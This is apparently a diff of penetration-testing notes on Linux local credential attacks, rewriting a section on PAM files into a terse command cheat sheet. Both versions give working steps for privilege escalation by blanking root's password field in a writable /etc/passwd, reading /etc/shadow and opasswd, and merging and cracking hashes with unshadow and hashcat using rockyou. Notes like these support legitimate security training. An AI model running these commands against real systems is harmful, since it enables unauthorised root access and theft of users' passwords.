@@ -1,84 +1,87 @@
-### Linux Authentication & Credential Harvesting
+## Local Credential Identification
 
-The Linux authentication process is primarily managed by **Pluggable Authentication Modules (PAM)**, specifically `pam_unix.so` or `pam_unix2.so`. These modules utilize standardized API calls to manage user information, sessions, and password updates by interacting with specific system files.
+Checking for inline hashes or mapping user accounts when local access is established.
 
-#### Critical System Files
+Read the world-readable password file to identify users and shell environments
 
-|File|Purpose|Permissions|
-|:--|:--|:--|
-|`/etc/passwd`|Stores user account information (7 structured fields).|World-readable.|
-|`/etc/shadow`|Stores hashed passwords and password management data.|Admin (root) only.|
-|`/etc/security/opasswd`|Stores previous passwords to prevent reuse.|Admin (root) only.|
+```
+cat /etc/passwd
+```
 
----
-
-#### 1. Exploiting Misconfigured `/etc/passwd` Permissions
-
-**Scenario:** Use when the `/etc/passwd` file is **writeable** by a low-privileged user due to administrative error.
-
-**Goal:** Bypass authentication by removing the root password requirement.
-
-1. **Identify write permissions** on `/etc/passwd`.
-2. **Modify the root entry** to remove the 'x' (or any value) in the password field.
+- **World-writable** `/etc/passwd` file or `/etc` directory
     
-    ```
-    # Original entry: root:x:0:0:root:/root:/bin/bash
-    # Modified entry:
-    root::0:0:root:/root:/bin/bash
-    ```
+- **Root** account with an empty password field
     
-3. **Switch to the root user**; the system will no longer prompt for a password.
+- **MD5** (ID 1) hashes present in legacy configurations or `opasswd`
     
-    ```
-    su
-    ```
+- **Password hash in passwd**: If the second field contains a hash instead of `x`, the account is vulnerable to direct cracking without shadow access.
+    
+- **Empty password field**: If the second field is empty, the system may allow login without a password prompt.
     
 
 ---
 
-#### 2. Identifying Password Hashes
+## Writable passwd Escalation
 
-When analyzing `/etc/shadow` or old passwords in `opasswd`, the **ID value** in the hash indicates the cryptographic algorithm used. Identifying the algorithm is critical for selecting the correct **cracking mode** and estimating the time required.
+The `/etc/passwd` file is writable due to administrative misconfiguration, allowing direct modification of user attributes.
 
-|ID|Cryptographic Hash Algorithm|Note|
-|:--|:--|:--|
-|`1`|MD5|Easier to crack; useful for pattern recognition.|
-|`2a`|Blowfish|Older algorithm.|
-|`5`|SHA-256|Standard algorithm.|
-|`6`|SHA-512|Standard algorithm.|
-|`y`|Yescrypt|Modern default for many distributions like Debian.|
-|`sha1`|SHA1crypt|Older algorithm.|
+Remove the root password requirement by clearing the second field in the entry
+
+```
+root::0:0:root:/root:/bin/bash
+```
+
+- **Write permissions** on the `/etc` directory inherited by inexperienced administrators.
+- **Write permissions** on `/etc/passwd` itself.
+
+**Silent failure**: Certain programs may **deny access** to specific functions if the password field is left empty.
 
 ---
 
-#### 3. Credential Harvesting & Cracking Workflow
+## Credential Extraction and Analysis
 
-**Scenario:** Use once **root access** is obtained to recover plaintext passwords for other users or to identify password reuse patterns across the network.
+Administrative access is achieved and hashes are needed for cracking or pattern analysis.
 
-**Operational Steps:**
+Read the shadow file to obtain modern hashes for all users
 
-1. **Backup the target files** to a temporary directory to avoid accidental corruption.
-    
-    ```
-    sudo cp /etc/passwd /tmp/passwd.bak
-    sudo cp /etc/shadow /tmp/shadow.bak
-    ```
-    
-2. **Combine the files** into a format readable by cracking tools using `unshadow`.
-    
-    ```
-    unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
-    ```
-    
-3. **Perform the crack** using `hashcat` or John the Ripper (JtR).
-    
-    ```
-    # Using Hashcat with a wordlist (Mode 1800 for SHA-512)
-    hashcat -m <MODE_ID> -a 0 /tmp/unshadowed.hashes <WORDLIST_PATH> -o /tmp/unshadowed.cracked
-    ```
-    
+```
+cat /etc/shadow
+```
 
-**Attack Implications:**
+View previous passwords to identify rotation patterns and weaker algorithms
 
-- **Pattern Recognition:** Recovering old hashes from `/etc/security/opasswd` helps identify if users follow predictable patterns when updating passwords, increasing the success rate of password guessing.
-- **Disabled Logins:** If the password field in `/etc/shadow` contains `!` or `*`, Unix password login is disabled, though **key-based** or **Kerberos** authentication may still be active.
+```
+cat /etc/security/opasswd
+```
+
+- **Algorithm Identification**: The ID value in the hash (e.g., `1` for **MD5**, `6` for **SHA-512**, `y` for **yescrypt**) dictates cracking speed and tool selection.
+- **Account Locking**: Fields containing `!` or `*` indicate the user **cannot log in** via standard Unix password authentication.
+
+**Insufficient privileges**: Accessing `/etc/shadow` or `/etc/security/opasswd` will **fail silently** or return a permission denied error without **root** or equivalent privileges.
+
+---
+
+## Credential Preparation and Cracking
+
+Moving extracted passwd and shadow data into a format compatible with automated cracking tools.
+
+Combine passwd and shadow files into a crackable format
+
+```
+unshadow <FILE_PATH>/passwd.bak <FILE_PATH>/shadow.bak > <FILE_PATH>/unshadowed.hashes
+```
+
+Execute a dictionary attack against unshadowed hashes using specific hash modes
+
+```
+hashcat -m 1800 -a 0 <FILE_PATH>/unshadowed.hashes <FILE_PATH>/rockyou.txt -o <FILE_PATH>/unshadowed.cracked
+```
+
+- John the Ripper
+    - `unshadow <PASSWD> <SHADOW>`
+    - Prefer for **single crack mode** to quickly test weak or predictable passwords.
+- Hashcat
+    - `hashcat -m <MODE> -a 0 <HASHES> <WORDLIST>`
+    - Prefer for high-performance GPU-based cracking once a specific algorithm is identified.
+
+**Invalid user**: If a user exists in `/etc/passwd` but has no corresponding entry in `/etc/shadow`, the user is **considered invalid** by the system.
